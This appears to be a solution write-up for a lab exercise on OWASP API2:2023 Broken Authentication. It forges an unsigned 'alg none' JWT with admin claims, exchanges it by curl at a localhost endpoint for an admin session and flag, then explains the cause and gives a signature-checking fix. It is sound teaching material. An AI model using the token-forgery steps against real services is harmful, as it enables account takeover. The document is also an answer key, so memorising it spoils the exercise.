# Solution: API2:2023 Broken Authentication

## 1. Walkthrough & Exploitation

### Step 1: Craft Forged Unsigned JWT Token
Header:
```json
{"alg": "none", "typ": "JWT"}
```
Payload:
```json
{"sub": "5", "username": "admin", "role": "admin"}
```
Base64URL encoded token (with trailing dot, no signature):
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`

### Step 2: Exchange Forged Token for Session
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/auth/session-exchange \
  -H "Content-Type: application/json" \
  -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}'
```

### Exploit Evidence
```json
{
  "status": "session_exchanged",
  "role": "admin",
  "username": "admin",
  "flag": "FLAG{API2_BROKEN_AUTH_TOKEN_FORGED_3391}"
}
```

---

## 2. Root Cause Analysis
The session exchange route called `jwt.decode(..., options={"verify_signature": False})` or permitted the `"none"` algorithm without validating cryptographic signatures against the server secret key.

---

## 3. Patched Implementation
```python
# FIX: API2-Broken-Auth
verified_claims = jwt.decode(
    payload.token,
    settings.JWT_SECRET,
    algorithms=["HS256"],
    options={"verify_signature": True},
)
```
